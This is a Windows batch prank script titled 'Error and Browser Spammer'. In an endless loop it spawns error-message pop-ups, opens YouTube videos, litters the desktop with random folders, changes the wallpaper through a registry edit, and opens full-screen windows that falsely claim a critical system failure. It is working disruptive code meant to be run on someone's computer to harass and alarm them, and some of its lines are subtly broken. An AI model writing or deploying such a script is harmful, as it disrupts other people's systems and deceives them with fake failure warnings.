@echo off
title Error and Browser Spammer
color 4F
echo Prank Activated - Press Ctrl+C to Stop!
echo.

:: Add a small delay to make the prank more chaotic but not instantaneous
setlocal enabledelayedexpansion

:: Set the stock Windows wallpaper directory
set wallpaper_dir=C:\Windows\Web\Wallpaper

:: List the subdirectories that contain the stock wallpapers
set dirs[0]=%wallpaper_dir%\Windows
set dirs[1]=%wallpaper_dir%\Flowers
set dirs[2]=%wallpaper_dir%\Nature
set dirs[3]=%wallpaper_dir%\DreamScene

:loop
:: Play an error sound using the system bell
echo ^G

:: Launch multiple error messages with no delay (you can add more VBScript files for variety)
start /b "" wscript.exe "%~dp0error_message.vbs"

:: Open a random YouTube URL in the default browser with no delay
set /a rand=%random% %% 3
if !rand! == 0 (
    start /b "" "https://www.youtube.com/watch?v=XtrD6jryOmc"
) else if !rand! == 1 (
    start /b "" "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
) else (
    start /b "" "https://www.youtube.com/watch?v=9bZkp7q19f0"
)

:: Create random folders and random files on the desktop
set /a rand2=%random% %% 2
if !rand2! == 0 (
    md "C:\Users\%username%\Desktop\%RANDOM%"
) else (
    md "C:\Users\%username%\Desktop\%RANDOM%\%RANDOM%"
    echo Random file content > "C:\Users\%username%\Desktop\%RANDOM%\%RANDOM%\%RANDOM%.txt"
)

:: Change the wallpaper randomly from stock Windows wallpapers
set /a "dir_index=%random% %% 4"
for /f "delims=" %%i in ('dir /b /a-d "!dirs[%dir_index%]!"') do (
    set "wallpaper=!dirs[%dir_index%]!\%%i"
    goto set_wallpaper
)

:set_wallpaper
:: Change the wallpaper to the randomly selected one
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wallpaper%" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

:: Open a full-screen command prompt window for added chaos
start /max cmd /c echo Critical system failure detected. Please restart your computer! && pause

:: Add a tiny delay to slow things down slightly (just to avoid system lockup)
timeout /nobreak /t 1 >nul

:: Repeat as fast as possible
goto loop